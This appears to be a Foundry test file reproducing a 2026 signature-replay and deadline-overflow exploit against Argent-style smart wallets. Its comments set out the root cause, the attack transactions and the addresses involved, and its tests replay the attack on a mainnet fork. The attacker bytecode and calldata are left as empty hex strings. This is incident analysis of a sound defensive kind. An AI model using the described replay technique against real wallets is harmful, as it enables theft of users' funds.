pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// Argent-style smart wallet - signature replay plus recovery-deadline overflow.
// ~$59.8K reported by SlowMist (~50,655.92 USDC measured on-chain), Ethereum mainnet, 2026-10-19.
//
// Attack tx 1 (e545 wallet) : 0xbfed8d33561ed5f9cbd0f4e62a5bbd20187a64f3e22180148dcb58ed6ebaa795 (block 26225798)
// Attack tx 2 (5a79 wallet) : 0xa0ee8f914205a948c79eca039b7d8265537eb220472c9be1455d3321f1bd571b (block 26225803)
// Attacker EOA              : 0xc10609ce5c032db92e562e463b1234aab0872b02
// Attack contract           : 0x3c5884377cca79ff221936aea4a5df43293fb310 (created block 26225763, owner = its deployer)
// Victim wallet e545        : 0xe545b9a69bff1bf0ed2e922551dda4afc8ee8f66
// Victim wallet 5a79        : 0x5a79e5772493cf4329682d202aa2d28f85a85440
// Recovery module (proxy)   : 0xf490557d67d934440677a4f16793d5ef319b8ef5  (impl 0x9996396280fbf9271ba2dd66bea8326207df50a0)
// Execution module (proxy)  : 0x4e50adfc953551286bbd7fee2b2b846d1d227394  (impl 0x7cd62b0258cc51ca988cafc6ff0597516c844b03)
// MARK token                : 0x67c597624b17b16fb77959217360b7cd18284253
// MARK/WETH Uniswap V2 pair  : 0x6f23d2fedb4ff4f1e9f8c521f66e5f2a1451b6f3 (holds ~0.001 WETH at the fork block, a thin pool)
// WETH                      : 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
// USDC (proceeds)           : 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
//
// ROOT CAUSE (two independent flaws on the wallet's module stack, both on the aacaaf88 relay path):
//   1. No replay protection on the relayed-signature path. The execution module's relay entry
//      (selector 0xaacaaf88) checks the owner/guardian ECDSA signature but never consumes a nonce
//      and never records the signed-message hash as used, so the same 65-byte signature is accepted
//      again later, and repeatedly inside one transaction.
//   2. The signed payload's deadline/expiry is not enforced (it overflows), so a signature produced
//      years ago still passes the time guard today. Combined with the recovery module's deadline
//      setter (selector 0x254a2e49), whose attacker-supplied period wraps the recovery deadline into
//      the past, an old guardian signature triggers an immediate same-transaction owner change.
//
// Both flaws make the drain permissionless: no private key, secret, or non-public state is needed.
// The two signatures the attacker replays were already public on-chain for years:
//   SIG1 (recovery, wallet e545) first used in tx 0xac549a6057816c740734a03b7c0bf1996da14102618146c21d5a1be9b5acb28d
//        at block 11266059 (2020-11-16), to the recovery module.
//   SIG2 (execute,  wallet e545) first used in tx 0xb6e27d6a6589b6a5e5b38d52e56b4dc9d753a519304a51a892dd42806f79b5f9
//        at block 11948627 (2021-02-28), to the execution module.
//   Both sets of bytes reappear verbatim in attack tx 1's calldata (confirmed by byte match).
//
// Reconstruction: one test per wallet leg, each forking at the parent of that leg's attack tx
// (e545 at block 26225797, 5a79 at block 26225802). Each test redeploys the attacker's exact
// creation bytecode from a fresh address (so the fresh deployer is its owner) and replays that
// leg's attack-tx calldata verbatim. The calldata carries the lifted signatures and references the
// wallets, modules and pool by absolute address, so no victim setup is re-run - each test starts
// from settled on-chain state and only re-submits the public signatures as the attacker. The e545
// leg nets 48,778.499253 USDC and the 5a79 leg 1,877.419234 USDC, 50,655.918487 USDC combined,
// matching the two attack transactions to the unit. The two historical signatures above are the
// e545 leg's; the 5a79 leg follows the same replay pattern and is confirmed by exact on-fork
// reproduction rather than by tracing its signatures to their original blocks.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract Argent_exp is Test {
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address constant ATTACK_CONTRACT_ONCHAIN = 0x3C5884377cCa79fF221936AEA4A5Df43293FB310;

    // attacker's on-chain creation bytecode (constructor takes no args, sets owner = msg.sender)
    bytes constant ATTACK_CREATION = hex"";
    // verbatim calldata of attack tx 1 (e545 wallet) and attack tx 2 (5a79 wallet)
    bytes constant TX1_INPUT = hex"";
    bytes constant TX2_INPUT = hex"";

    function _deployAttacker() internal returns (address deployed) {
        bytes memory code = ATTACK_CREATION;
        assembly {
            deployed := create(0, add(code, 0x20), mload(code))
        }
        require(deployed != address(0), "attack contract deploy failed");
    }

    // e545 wallet leg, replayed at the parent of attack tx 1 (block 26225798)
    function test_e545_leg() public {
        vm.createSelectFork("mainnet", 26225797);
        address attacker = _deployAttacker();
        assertEq(USDC.balanceOf(attacker), 0, "attacker starts with no USDC");
        (bool ok,) = attacker.call(TX1_INPUT);
        require(ok, "e545 leg (attack tx 1) reverted");
        uint256 gain = USDC.balanceOf(attacker);
        emit log_named_decimal_uint("e545 leg USDC gain", gain, 6);
        assertApproxEqAbs(gain, 48_778_499253, 1e5, "e545 leg did not reproduce");
    }

    // 5a79 wallet leg, replayed at the parent of attack tx 2 (block 26225803)
    function test_5a79_leg() public {
        vm.createSelectFork("mainnet", 26225802);
        address attacker = _deployAttacker();
        assertEq(USDC.balanceOf(attacker), 0, "attacker starts with no USDC");
        (bool ok,) = attacker.call(TX2_INPUT);
        require(ok, "5a79 leg (attack tx 2) reverted");
        uint256 gain = USDC.balanceOf(attacker);
        emit log_named_decimal_uint("5a79 leg USDC gain", gain, 6);
        assertApproxEqAbs(gain, 1_877_419234, 1e5, "5a79 leg did not reproduce");
    }
}
